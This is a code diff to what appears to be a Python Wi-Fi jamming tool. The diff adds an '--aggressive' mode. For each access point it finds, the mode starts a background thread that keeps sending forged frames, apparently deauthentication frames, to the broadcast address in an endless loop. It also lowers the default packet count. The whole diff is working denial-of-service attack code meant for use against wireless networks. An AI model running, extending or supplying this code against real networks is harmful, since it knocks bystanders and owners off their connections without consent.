@@ -31,6 +31,7 @@ class JAMMER:
 	__BROADCAST    = "ff:ff:ff:ff:ff:ff"
 
 	def __init__(self, prs):
+		self.aggressive = prs.aggressive
 		self.verbose    = prs.verbose
 		self.exceptions = prs.exceptions
 
@@ -114,7 +115,28 @@ class JAMMER:
 				retval['ap'] = rc
 				retval['sta'] = sn
 
-		return retval			
+		return retval	
+
+	def aggressive_run(self, ap, sta):
+		pkt = self.forge(ap, sta)[0]
+
+		self.write(ap, sta)
+
+		while True:
+			sendp(
+				pkt,
+				iface=self.interface,
+				count=1,
+				inter=0,
+				verbose=False
+			)	
+
+	def aggressive_handler(self, ap, sta):		
+		if (sta not in self.exceptions) and (self.aggressive) and (len(self.channel) == 1):
+			t = threading.Thread(target=self.aggressive_run, args=(ap, sta))
+			t.daemon = True
+			t.start()
+
 
 	def clarify(self, toappend):
 		essid = toappend.get('essid')
@@ -125,14 +147,18 @@ class JAMMER:
 				if self.aps:
 					if bssid in self.aps:
 						self.__ACCESSPOINTS.append( toappend )
+						self.aggressive_handler(bssid, self.__BROADCAST)
 				else:
 					self.__ACCESSPOINTS.append( toappend )
+					self.aggressive_handler(bssid, self.__BROADCAST)
 		else:
 			if self.aps:
 				if bssid in self.aps:
 					self.__ACCESSPOINTS.append( toappend )
+					self.aggressive_handler(bssid, self.__BROADCAST)
 			else:
 				self.__ACCESSPOINTS.append( toappend )
+				self.aggressive_handler(bssid, self.__BROADCAST)
 
 	def invalid(self, sta):
 		for exception in self.exceptions:
@@ -308,6 +334,7 @@ class PARSER:
 	def __init__(self, opts):
 		self.help        = self.help(opts.help)
 		self.world       = opts.world
+		self.aggressive  = opts.aggressive
 		self.exceptions  = self.exceptions(opts.nbroadcast)
 		self.verbose     = opts.verbose
 		self.interface   = self.interface(opts.interface)
@@ -406,12 +433,13 @@ def main():
 	parser.add_argument('-s', '--stations'    , dest="stations", default="", type=str)
 	parser.add_argument('-f', '--filters'     , dest="filters" , default="", type=str)
 
-	parser.add_argument('-p', '--packets'     , dest="packets" , default=25 , type=int)
+	parser.add_argument('-p', '--packets'     , dest="packets" , default=5 , type=int)
 	parser.add_argument('-d', '--delay'       , dest="delay"   , default=0.1, type=int)
 	parser.add_argument('-r', '--reset'       , dest="reset"   , default=0  , type=int)
 	parser.add_argument('--code'              , dest="code"    , default=7  , type=int)
 
 	parser.add_argument('--world'             , dest="world"     , default=False, action="store_true")
+	parser.add_argument('--aggressive'        , dest="aggressive", default=False, action="store_true")
 	parser.add_argument('--no-broadcast'      , dest="nbroadcast", default=False, action="store_true")
 	parser.add_argument('--verbose'           , dest="verbose"   , default=False, action="store_true")
 
